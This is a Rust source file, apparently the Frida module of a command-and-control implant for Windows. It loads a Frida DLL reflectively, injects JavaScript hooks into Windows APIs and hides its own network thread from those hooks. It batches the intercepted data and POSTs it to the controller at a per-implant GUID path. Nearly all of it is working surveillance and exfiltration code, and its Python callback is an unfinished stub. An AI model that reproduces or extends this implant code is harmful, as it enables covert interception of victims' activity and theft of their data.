//! Frida integration module
//!
//! This module provides dynamic instrumentation capabilities via Frida gadget DLL.
//! The DLL is loaded from a network location (like Python) and provides:
//! - JavaScript-based hooking of Windows APIs
//! - Message callbacks for intercepted data
//! - HTTP POST callback for sending data to a remote server
//! - Python callback support when the python feature is enabled

use core::{
    ffi::{c_char, c_int, c_void, CStr},
    ptr::null_mut,
};

use alloc::string::String;
use alloc::vec::Vec;

use crate::get_instance;
use crate::libs::utils::write_output;

/// Context passed through to the message callback via user_data
#[repr(C)]
pub struct HookContext {
    pub name: *const c_char,
    pub hook_id: *const c_char,
    pub batch_size: u32,
    pub flush_interval_ms: u64,
}

/// Tracked hook with optional name
#[derive(Clone)]
pub struct TrackedHook {
    pub id: i32,
    pub name: Option<String>,
    /// Server-assigned hook UUID
    pub hook_id: Option<String>,
    /// Pointer to the leaked HookContext for this hook
    pub context: *mut HookContext,
    pub batch_size: u32,
    pub flush_interval_ms: u64,
}

/// A single Frida event for batching
#[derive(Clone)]
pub struct FridaEvent {
    pub event_type: String,
    pub payload: String,
    pub timestamp: u64, // Unix timestamp in milliseconds (UTC)
    pub name: Option<String>,
    pub hook_id: Option<String>,
}

/// Maximum events per batch
const MAX_BATCH_SIZE: usize = 50;

/// Flush interval in milliseconds (5 seconds)
const FLUSH_INTERVAL_MS: u64 = 5000;

/// Function pointer types for Frida DLL exports
pub type FridaHook = unsafe extern "C" fn(
    script: *const c_char,
    callback: unsafe extern "C" fn(*const c_char, *mut c_void, *mut c_void),
    user_data: *mut c_void,
) -> c_int;

pub type FridaUnloadHook = unsafe extern "C" fn(c_int) -> bool;

/// Frida API function pointers (for in-memory Frida DLL)
pub struct FridaApi {
    /// Base address of the loaded Frida DLL (null if not loaded)
    pub dll_base: *mut c_void,
    /// Hook function - installs a Frida script with callback
    pub hook: Option<FridaHook>,
    /// Unload hook function - removes an installed hook
    pub unload_hook: Option<FridaUnloadHook>,
    /// Callback host for HTTP POST (empty = stdout)
    pub callback_host: String,
    /// Callback port for HTTP POST
    pub callback_port: u16,
    /// Tracked hooks (id + optional name)
    pub hooks: Vec<TrackedHook>,
    /// Thread ID to skip in hooks (set during callback HTTP POST)
    pub skip_tid: u32,
    /// Python callback object (when python feature enabled)
    #[cfg(feature = "python")]
    pub py_callback: *mut c_void,
    /// Batched events waiting to be sent
    pub event_batch: Vec<FridaEvent>,
    /// Last flush timestamp (milliseconds since Unix epoch)
    pub last_flush_time: u64,
}

impl FridaApi {
    pub fn new() -> Self {
        FridaApi {
            dll_base: null_mut(),
            hook: None,
            unload_hook: None,
            callback_host: String::new(),
            callback_port: 0,
            hooks: Vec::new(),
            skip_tid: 0,
            #[cfg(feature = "python")]
            py_callback: null_mut(),
            event_batch: Vec::new(),
            last_flush_time: 0,
        }
    }

    /// Check if Frida DLL is loaded
    pub fn is_loaded(&self) -> bool {
        !self.dll_base.is_null()
    }
}

unsafe impl Sync for FridaApi {}
unsafe impl Send for FridaApi {}

/// Initialize Frida functions from a reflectively loaded DLL
pub fn init_frida_from_dll(dll_base: *mut c_void) -> Result<(), u32> {
    unsafe {
        let instance = get_instance().ok_or(0x80004005u32)?;

        // Get hook export
        let hook_addr = crate::inject::get_reflective_export(dll_base, b"hook\0");
        if hook_addr.is_none() {
            return Err(0x80004005);
        }

        // Get unload_hook export
        let unload_hook_addr = crate::inject::get_reflective_export(dll_base, b"unload_hook\0");
        if unload_hook_addr.is_none() {
            return Err(0x80004005);
        }

        instance.frida.dll_base = dll_base;
        instance.frida.hook = Some(core::mem::transmute(hook_addr.unwrap()));
        instance.frida.unload_hook = Some(core::mem::transmute(unload_hook_addr.unwrap()));

        Ok(())
    }
}

/// Get current UTC timestamp in milliseconds using Windows API
unsafe fn get_utc_timestamp_ms() -> u64 {
    let instance = match get_instance() {
        Some(i) => i,
        None => return 0,
    };

    // FILETIME is 100-nanosecond intervals since January 1, 1601 (UTC)
    let mut filetime: [u32; 2] = [0, 0];
    (instance.k32.get_system_time_as_file_time)(filetime.as_mut_ptr() as *mut c_void);

    // Combine low and high parts
    let ft = (filetime[1] as u64) << 32 | (filetime[0] as u64);

    // Convert to Unix epoch (subtract 116444736000000000 hundred-nanoseconds between 1601 and 1970)
    // Then convert from 100-nanoseconds to milliseconds
    const EPOCH_DIFF: u64 = 116444736000000000;
    if ft > EPOCH_DIFF {
        (ft - EPOCH_DIFF) / 10000
    } else {
        0
    }
}

/// Message callback that handles Frida messages
/// This is called by Frida when send() is used in JavaScript
pub unsafe extern "C" fn message_callback(
    message: *const c_char,
    _data: *mut c_void,
    user_data: *mut c_void,
) {
    if message.is_null() {
        return;
    }

    let msg = CStr::from_ptr(message).to_string_lossy();
    let msg_bytes = msg.as_bytes();

    let instance = match get_instance() {
        Some(i) => i,
        None => {

            #[cfg(feature = "debug")]
            write_output(msg_bytes);
            return;
        }
    };

    // Check if we should batch and send via HTTP POST
    if !instance.frida.callback_host.is_empty() && instance.frida.callback_port > 0 {
        #[cfg(feature = "network")]
        {
            let now = get_utc_timestamp_ms();

            // Get hook name and hook_id from HookContext passed via user_data
            let (hook_name, hook_id) = if !user_data.is_null() {
                let ctx = &*(user_data as *const HookContext);
                let name = if !ctx.name.is_null() {
                    Some(String::from(CStr::from_ptr(ctx.name).to_string_lossy().as_ref()))
                } else {
                    None
                };
                let id = if !ctx.hook_id.is_null() {
                    Some(String::from(CStr::from_ptr(ctx.hook_id).to_string_lossy().as_ref()))
                } else {
                    None
                };
                (name, id)
            } else {
                (None, None)
            };

            // Add event to batch
            let event = FridaEvent {
                event_type: String::from("frida"),
                payload: String::from(msg.as_ref()),
                timestamp: now,
                name: hook_name,
                hook_id,
            };
            instance.frida.event_batch.push(event);

            // Read batch_size/flush_interval from HookContext, fall back to defaults
            let (batch_sz, flush_int) = if !user_data.is_null() {
                let ctx = &*(user_data as *const HookContext);
                (ctx.batch_size as usize, ctx.flush_interval_ms)
            } else {
                (MAX_BATCH_SIZE, FLUSH_INTERVAL_MS)
            };

            // Flush if batch is full OR interval has elapsed
            let time_elapsed = now.saturating_sub(instance.frida.last_flush_time);
            if instance.frida.event_batch.len() >= batch_sz || time_elapsed >= flush_int {
                flush_event_batch();
            }
        }
        return;
    }

    // Check if we have a Python callback
    #[cfg(feature = "python")]
    {
        if !instance.frida.py_callback.is_null() {
            call_python_callback(&instance.python, instance.frida.py_callback, msg_bytes);
            return;
        }
    }

    // Default: write to stdout
    #[cfg(feature = "debug")]
    write_output(msg_bytes);
}

/// Flush the Frida event batch to the server
#[cfg(feature = "network")]
pub fn flush_event_batch() {
    unsafe {
        let instance = match get_instance() {
            Some(i) => i,
            None => return,
        };

        if instance.frida.event_batch.is_empty() {
            return;
        }

        // Build path with GUID: /frida/{guid}
        let guid = match &instance.c2_guid {
            Some(g) => g.clone(),
            None => {
                // No GUID yet - can't send events without checking in first
                #[cfg(feature = "debug")]
                write_output(b"[frida] no guid, discarding events\n");
                instance.frida.event_batch.clear();
                return;
            }
        };

        use crate::libs::winhttp::HttpClient;

        // Set skip_tid to current thread so hooks know to ignore our HTTP call
        let current_tid = (instance.k32.get_current_thread_id)();
        instance.frida.skip_tid = current_tid;

        // Build JSON body: {"events": [{"type": "...", "payload": {...}, "timestamp": ...}, ...]}
        let mut json = String::from("{\"events\":[");
        let mut first = true;
        for event in &instance.frida.event_batch {
            if !first {
                json.push(',');
            }
            first = false;
            json.push_str("{\"type\":\"");
            json.push_str(&escape_json_string(&event.event_type));
            json.push_str("\",\"payload\":");
            // Payload is already JSON from Frida's send()
            json.push_str(&event.payload);
            json.push_str(",\"timestamp\":");
            json.push_str(&u64_to_dec(event.timestamp));
            if let Some(ref name) = event.name {
                json.push_str(",\"name\":\"");
                json.push_str(&escape_json_string(name));
                json.push('"');
            }
            if let Some(ref hook_id) = event.hook_id {
                json.push_str(",\"hook_id\":\"");
                json.push_str(&escape_json_string(hook_id));
                json.push('"');
            }
            json.push('}');
        }
        json.push_str("]}");

        if let Ok(mut client) = HttpClient::new() {
            let host = &instance.frida.callback_host;
            let port = instance.frida.callback_port;

            // Set Content-Type header for JSON
            client.headers = Some(String::from("Content-Type: application/json\r\n"));

            // Build path: /frida/{guid}
            let mut path = String::from("/frida/");
            path.push_str(&guid);

            // Fire and forget - don't care about response
            let _ = client.send("POST", host, port, &path, false, Some(&json));
        }

        // Clear batch, update flush time, and reset skip_tid
        instance.frida.event_batch.clear();
        instance.frida.last_flush_time = get_utc_timestamp_ms();
        instance.frida.skip_tid = 0;
    }
}

/// Escape a string for JSON
fn escape_json_string(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        match c {
            '"' => result.push_str("\\\""),
            '\\' => result.push_str("\\\\"),
            '\n' => result.push_str("\\n"),
            '\r' => result.push_str("\\r"),
            '\t' => result.push_str("\\t"),
            _ => result.push(c),
        }
    }
    result
}

/// Convert u64 to decimal string (no_std compatible)
fn u64_to_dec(value: u64) -> String {
    if value == 0 {
        return String::from("0");
    }
    let mut result = String::new();
    let mut v = value;
    while v > 0 {
        let digit = (v % 10) as u8;
        result.insert(0, (b'0' + digit) as char);
        v /= 10;
    }
    result
}

/// Call a Python callback with the message data
#[cfg(feature = "python")]
unsafe fn call_python_callback(
    py: &crate::libs::instance::PythonApi,
    callback: *mut c_void,
    message: &[u8],
) {
    // PyObject_CallFunction with a single string argument
    type PyObjectCall = unsafe extern "C" fn(*mut c_void, *mut c_void) -> *mut c_void;
    type PyTupleNew = unsafe extern "C" fn(isize) -> *mut c_void;
    type PyTupleSetItem = unsafe extern "C" fn(*mut c_void, isize, *mut c_void) -> i32;

    let instance = match get_instance() {
        Some(i) => i,
        None => return,
    };

    // We need PyObject_Call and PyTuple_New/SetItem
    // Get these from the DLL if available
    let dll_base = instance.frida.dll_base;
    if dll_base.is_null() {
        return;
    }

    // Try to call the callback with the message as a string argument
    // Build a tuple with the message string
    if let Some(tuple_new_fn) = py.list_new {
        // We'll use PyUnicode_FromString to create the argument
        if let Some(str_from) = py.unicode_from_string {
            let mut msg_cstr = message.to_vec();
            msg_cstr.push(0);
            let msg_obj = str_from(msg_cstr.as_ptr());

            // for nowwrite to output as fallback
            #[cfg(feature = "debug")]
            write_output(message);
        }
    }
}

/// Get the address of skip_tid for use in Frida scripts
pub fn get_skip_tid_addr() -> Option<usize> {
    unsafe {
        let instance = get_instance()?;
        let addr = &instance.frida.skip_tid as *const u32 as usize;
        Some(addr)
    }
}

/// Install a Frida hook with the given JavaScript script
/// Always injects safeHook() helper to prevent recursion from callbacks
/// Returns the hook ID on success
pub fn install_hook(script: &str, name: Option<&str>, batch_size: u32, flush_interval_ms: u64) -> Result<i32, u32> {
    unsafe {
        let instance = get_instance().ok_or(0x80004005u32)?;

        // Reject duplicate hook names
        if let Some(hook_name) = name {
            if instance.frida.hooks.iter().any(|h| h.name.as_deref() == Some(hook_name)) {
                return Err(0x80070057);
            }
        }

        let hook_fn = instance.frida.hook.ok_or(0x80004001u32)?;

        // Inject skip_tid address and safeHook helper
        // safeHook(target, callbacks) - wrapper around Interceptor.attach with skip check
        // target can be string (function name) or ptr (address)
        let skip_tid_addr = get_skip_tid_addr().ok_or(0x80004005u32)?;
        let mut final_script = String::from("var __skipTidPtr = ptr('0x");
        let addr_hex = format_hex(skip_tid_addr);
        final_script.push_str(&addr_hex);
        // safeHook: wraps Interceptor.attach, adds skip check to onEnter/onLeave
        final_script.push_str("'); function safeHook(target, callbacks) { var fn = typeof target === 'string' ? Module.findGlobalExportByName(target) : target; if (!fn) return -1; var wrapped = {}; if (callbacks.onEnter) { var orig = callbacks.onEnter; wrapped.onEnter = function(args) { if (__skipTidPtr.readU32() === Process.getCurrentThreadId()) return; orig.call(this, args); }; } if (callbacks.onLeave) { var orig = callbacks.onLeave; wrapped.onLeave = function(retval) { if (__skipTidPtr.readU32() === Process.getCurrentThreadId()) return; orig.call(this, retval); }; } Interceptor.attach(fn, wrapped); return 0; } ");
        final_script.push_str(script);

        // Create null-terminated script
        let mut script_cstr = final_script.as_bytes().to_vec();
        script_cstr.push(0);

        // Build HookContext and leak it so it lives as long as the hook
        let name_ptr = if let Some(hook_name) = name {
            let mut name_bytes = hook_name.as_bytes().to_vec();
            name_bytes.push(0);
            let ptr = name_bytes.as_ptr() as *const c_char;
            core::mem::forget(name_bytes);
            ptr
        } else {
            core::ptr::null()
        };

        let ctx = alloc::boxed::Box::new(HookContext { name: name_ptr, hook_id: core::ptr::null(), batch_size, flush_interval_ms });
        let ctx_ptr = alloc::boxed::Box::into_raw(ctx);

        let hook_id = hook_fn(script_cstr.as_ptr() as *const c_char, message_callback, ctx_ptr as *mut c_void);

        if hook_id < 0 {
            return Err(0x80004005);
        }

        // Track the hook
        instance.frida.hooks.push(TrackedHook {
            id: hook_id,
            name: name.map(String::from),
            hook_id: None,
            context: ctx_ptr,
            batch_size,
            flush_interval_ms,
        });

        Ok(hook_id)
    }
}

/// Format a usize as hex string (no_std compatible)
fn format_hex(value: usize) -> String {
    if value == 0 {
        return String::from("0");
    }
    let mut result = String::new();
    let mut v = value;
    while v > 0 {
        let digit = (v & 0xF) as u8;
        let c = if digit < 10 { b'0' + digit } else { b'a' + digit - 10 };
        result.insert(0, c as char);
        v >>= 4;
    }
    result
}

/// Set the server-assigned hook UUID on a tracked hook (by DLL hook id)
/// Updates both the TrackedHook and the leaked HookContext so events get tagged
pub fn set_hook_server_id(dll_hook_id: i32, server_hook_id: &str) {
    unsafe {
        let instance = match get_instance() {
            Some(i) => i,
            None => return,
        };

        if let Some(hook) = instance.frida.hooks.iter_mut().find(|h| h.id == dll_hook_id) {
            hook.hook_id = Some(String::from(server_hook_id));

            // Leak a C string for the hook_id and store in HookContext
            if !hook.context.is_null() {
                let mut id_bytes = server_hook_id.as_bytes().to_vec();
                id_bytes.push(0);
                let ptr = id_bytes.as_ptr() as *const c_char;
                core::mem::forget(id_bytes);
                (*hook.context).hook_id = ptr;
            }
        }
    }
}

/// Unload a hook by ID
pub fn unload_hook_by_id(hook_id: i32) -> Result<(), u32> {
    unsafe {
        let instance = get_instance().ok_or(0x80004005u32)?;

        let unload_fn = instance.frida.unload_hook.ok_or(0x80004001u32)?;

        if unload_fn(hook_id) {
            // Remove from tracked hooks
            instance.frida.hooks.retain(|h| h.id != hook_id);
            Ok(())
        } else {
            Err(0x80004005)
        }
    }
}

/// Unload a hook by name
pub fn unload_hook_by_name(name: &str) -> Result<(), u32> {
    unsafe {
        let instance = get_instance().ok_or(0x80004005u32)?;

        // Find hook by name
        let hook_id = instance.frida.hooks.iter()
            .find(|h| h.name.as_deref() == Some(name))
            .map(|h| h.id)
            .ok_or(0x80070057u32)?;

        unload_hook_by_id(hook_id)
    }
}

/// Unload all hooks
pub fn unload_all_hooks() -> Result<u32, u32> {
    unsafe {
        let instance = get_instance().ok_or(0x80004005u32)?;

        let unload_fn = instance.frida.unload_hook.ok_or(0x80004001u32)?;

        let mut count = 0u32;
        let hook_ids: Vec<i32> = instance.frida.hooks.iter().map(|h| h.id).collect();

        for hook_id in hook_ids {
            if unload_fn(hook_id) {
                count += 1;
            }
        }

        instance.frida.hooks.clear();
        Ok(count)
    }
}

/// Get server hook_ids that would be affected by an unload operation
/// Call before unload_hook to know which hooks to notify the server about
pub fn get_hook_server_ids(hook_id: Option<i32>, name: Option<&str>) -> Vec<String> {
    unsafe {
        let instance = match get_instance() {
            Some(i) => i,
            None => return Vec::new(),
        };

        match (hook_id, name) {
            (Some(id), _) => {
                instance.frida.hooks.iter()
                    .filter(|h| h.id == id)
                    .filter_map(|h| h.hook_id.clone())
                    .collect()
            }
            (None, Some(n)) => {
                instance.frida.hooks.iter()
                    .filter(|h| h.name.as_deref() == Some(n))
                    .filter_map(|h| h.hook_id.clone())
                    .collect()
            }
            (None, None) => {
                instance.frida.hooks.iter()
                    .filter_map(|h| h.hook_id.clone())
                    .collect()
            }
        }
    }
}

/// Unload hook - by ID, by name, or all
/// - hook_id = Some(id) and name = None: unload by ID
/// - hook_id = None and name = Some(n): unload by name
/// - hook_id = None and name = None: unload all
pub fn unload_hook(hook_id: Option<i32>, name: Option<&str>) -> Result<u32, u32> {
    match (hook_id, name) {
        (Some(id), _) => {
            unload_hook_by_id(id)?;
            Ok(1)
        }
        (None, Some(n)) => {
            unload_hook_by_name(n)?;
            Ok(1)
        }
        (None, None) => {
            unload_all_hooks()
        }
    }
}

/// Set the HTTP callback destination for Frida messages
pub fn set_http_callback(host: &str, port: u16) {
    unsafe {
        if let Some(instance) = get_instance() {
            instance.frida.callback_host = String::from(host);
            instance.frida.callback_port = port;
        }
    }
}

/// Clear the HTTP callback (messages will go to stdout)
pub fn clear_http_callback() {
    unsafe {
        if let Some(instance) = get_instance() {
            instance.frida.callback_host.clear();
            instance.frida.callback_port = 0;
        }
    }
}

/// Set a Python callback for Frida messages
#[cfg(feature = "python")]
pub fn set_python_callback(callback: *mut c_void) {
    unsafe {
        if let Some(instance) = get_instance() {
            instance.frida.py_callback = callback;
        }
    }
}

/// Clear the Python callback
#[cfg(feature = "python")]
pub fn clear_python_callback() {
    unsafe {
        if let Some(instance) = get_instance() {
            instance.frida.py_callback = null_mut();
        }
    }
}
